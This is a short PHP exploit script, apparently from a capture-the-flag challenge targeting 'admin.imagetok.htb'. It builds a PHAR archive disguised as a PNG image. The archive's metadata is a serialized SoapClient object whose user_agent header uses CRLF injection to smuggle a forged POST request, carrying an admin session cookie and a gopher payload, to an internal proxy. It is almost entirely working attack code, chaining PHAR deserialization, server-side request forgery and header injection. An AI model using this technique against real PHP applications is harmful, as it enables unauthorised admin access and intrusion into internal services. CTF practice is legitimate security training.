<?php
class ImageModel
{
    public $file;
 
    public function __construct()
    {
        $this->file = new SoapClient(null, array(
            "location" => "http://localhost:80/proxy",
            "uri" => "http://localhost:80/proxy",
            "user_agent" => "\r\n\r\n\r\n\r\n" .
                "POST /proxy HTTP/1.1\r\n" .
                "Host: admin.imagetok.htb\r\n" .
                "Connection: close\r\n" .
                "Cookie: PHPSESSID=$admin_session_cookie;\r\n" .
                "Content-Type: application/x-www-form-urlencoded\r\n" .
                "Content-Length: $gopher_payload_length\r\n\r\n" .
                "url=$gohper_payload" .
                "\r\n\r\n\r\n"
        ));
    }
}
 
@unlink('payload.phar');
$phar = new Phar('payload.phar');
$phar->startBuffering();
$phar->addFile($image_file, $image_file);
$phar->setStub(file_get_contents($image_file) . ' __HALT_COMPILER(); ?-->');
$phar->setMetadata(new ImageModel());
$phar->stopBuffering();
system('mv payload.phar payload.png');